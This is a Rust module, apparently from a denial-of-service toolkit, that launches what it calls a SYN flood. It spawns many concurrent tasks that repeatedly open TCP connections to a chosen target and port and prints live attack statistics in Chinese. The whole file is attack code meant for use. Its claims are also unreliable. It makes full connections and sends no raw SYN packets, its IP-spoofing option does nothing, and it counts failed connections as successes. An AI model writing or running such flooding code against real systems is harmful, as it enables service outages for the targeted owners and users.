use crate::{attacks::{AttackConfig, AttackResult}, stats::StatsArc, utils};
use std::net::TcpStream;
use std::time::{Duration, Instant};
use tokio::time::sleep;
use rand::Rng;

pub async fn run_syn_attack(config: AttackConfig, stats: StatsArc) -> AttackResult {
    println!("🌊 SYN洪水攻击启动");
    println!("目标: {}:{}", config.target, config.port);
    println!("攻击模式: {}", config.mode);
    println!("并发连接: {}", config.connections);
    println!("持续时间: {}秒", config.duration);
    println!("数据包大小: {} 字节", config.packet_size);
    println!("IP伪造: {}", if config.spoof_ip { "启用" } else { "禁用" });
    println!();

    let start_time = Instant::now();
    let duration = Duration::from_secs(config.duration);
    
    // 调整参数
    let adjusted_connections = utils::adjust_connections_by_mode(config.connections, &config.mode, "syn");
    let (min_delay, max_delay) = utils::get_delay_by_mode(&config.mode, "syn");

    println!("🎯 调整后的参数:");
    println!("实际并发数: {}", adjusted_connections);
    println!("延迟范围: {}ms - {}ms", min_delay, max_delay);
    println!();

    // 创建攻击任务
    let mut tasks = Vec::new();
    for _ in 0..adjusted_connections {
        let target = config.target.clone();
        let port = config.port;
        let packet_size = config.packet_size;
        let stats = stats.clone();
        let duration = duration.clone();

        let task = tokio::spawn(async move {
            let start = Instant::now();
            
            while start.elapsed() < duration {
                let request_start = Instant::now();

                // 尝试建立TCP连接（SYN包）
                match TcpStream::connect(format!("{}:{}", target, port)) {
                    Ok(_stream) => {
                        // 连接建立成功，立即关闭（模拟SYN洪水）
                        drop(_stream);
                        {
                            let mut stats = stats.lock().unwrap();
                            stats.add_request(true, packet_size as u64, 0);
                        }
                    }
                    Err(_) => {
                        // 连接失败，但SYN包已发送
                        {
                            let mut stats = stats.lock().unwrap();
                            stats.add_request(true, packet_size as u64, 0);
                        }
                    }
                }

                // 延迟
                let elapsed = request_start.elapsed();
                if elapsed < Duration::from_millis(max_delay) {
                    let random_delay = rand::thread_rng().gen_range(min_delay..max_delay);
                    sleep(Duration::from_millis(random_delay)).await;
                }
            }
        });
        tasks.push(task);
    }

    // 统计监控任务
    let stats_monitor = stats.clone();
    let monitor_task = tokio::spawn(async move {
        let mut last_stats = crate::stats::Stats::default();
        let mut last_time = Instant::now();
        let start = Instant::now();

        while start.elapsed() < duration {
            sleep(Duration::from_secs(1)).await;
            let current_stats = stats_monitor.lock().unwrap();
            let current_time = Instant::now();
            let time_diff = current_time.duration_since(last_time).as_secs_f64();
            let requests_diff = current_stats.total_requests - last_stats.total_requests;
            let rps = requests_diff as f64 / time_diff;
            let elapsed_seconds = start.elapsed().as_secs();

            println!("⏱️ [{}s] SYN RPS: {:.0} | 成功: {} | 失败: {} | 总计: {}", 
                elapsed_seconds,
                rps, 
                current_stats.successful_requests, 
                current_stats.failed_requests, 
                current_stats.total_requests
            );

            last_stats = current_stats.clone();
            last_time = current_time;
        }
    });

    // 进度监控任务
    let progress_task = tokio::spawn(async move {
        let mut elapsed = 0u64;
        while elapsed < config.duration {
            sleep(Duration::from_secs(1)).await;
            elapsed += 1;
            println!("⏳ SYN攻击进度: {}/{} 秒", elapsed, config.duration);
        }
        println!("✅ SYN攻击完成！");
    });

    // 等待攻击完成
    tokio::select! {
        _ = progress_task => {
            println!("✅ SYN攻击完成！");
        }
    }

    // 取消所有任务
    for task in tasks {
        task.abort();
    }
    monitor_task.abort();

    // 生成结果
    let final_stats = stats.lock().unwrap();
    let elapsed = start_time.elapsed();
    AttackResult::new(&final_stats, elapsed)
} 